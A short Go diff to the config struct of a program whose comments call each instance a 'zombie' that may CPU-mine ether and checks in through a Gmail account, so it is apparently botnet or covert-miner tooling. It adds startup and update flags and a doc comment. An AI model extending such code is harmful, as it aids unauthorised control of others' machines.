@@ -23,12 +23,20 @@ type Config struct {
 	CPUMine                     bool          `json:CPUMine`                     // If this zombie is mining ether, should it CPU mine?
 	DeviceName                  string        `json:DeviceName`
 	DeviceId                    string        `json:DeviceId`
+	InitialStartup              bool          `json:InitialStartup`      // Whether or not this is the first time that the program is starting.
+	FirstRunAfterUpdate         bool          `json:FirstRunAfterUpdate` // Whether or not this is the first time that the program is running after an update has been executed.
 
-	// You may manually set these in your code if you wish if it remains private. Otherwise you may configure the email credentials file instead.
+	// You may manually set these values in your code if it remains private to you only. Otherwise you may configure the email credentials file instead for the values to be pulled from.
 	CheckInGmailAddress  string // the gmail address to send updates to and receive updates from. parsed from line 1 of CheckInEmailCredentialsFile
 	CheckInGmailPassword string // the password for the gmail account. parsed from line 2 of CheckInEmailCredentialsFile
 }
 
+// ConfigFromFile is a constructor which will generate a config struct from the
+// given file path which should point to a valid JSON file containing key and
+// value pairs for all the fields in the config struct that you wish to use
+// throughout the code. A sample config file is provided, config.json, which
+// tells you all of the possible fields to include as well as hopefully enough
+// of a clue as to what their use is.
 func ConfigFromFile(fileName string) (*Config, error) {
 
 	bytes, loadErr := ioutil.ReadFile(fileName)
